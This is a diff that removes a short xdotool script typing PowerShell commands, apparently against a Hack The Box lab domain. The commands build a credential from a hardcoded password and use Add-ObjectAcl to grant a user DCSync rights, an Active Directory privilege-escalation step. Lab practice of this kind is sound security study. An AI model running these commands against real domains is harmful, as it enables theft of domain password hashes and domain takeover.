@@ -1,9 +1,0 @@
-xdotool type --delay 10 "$pass = convertto-securestring 'abc123!' -asplain -force"
-xdotool key Return
-
-xdotool type --delay 10 "$cred = new-object system.management.automation.pscredential('htb\john', $pass)"
-xdotool key Return
-
-xdotool type --delay 10 "Add-ObjectAcl -PrincipalIdentity john -Credential $cred -Rights DCSync"
-xdotool key Return
-
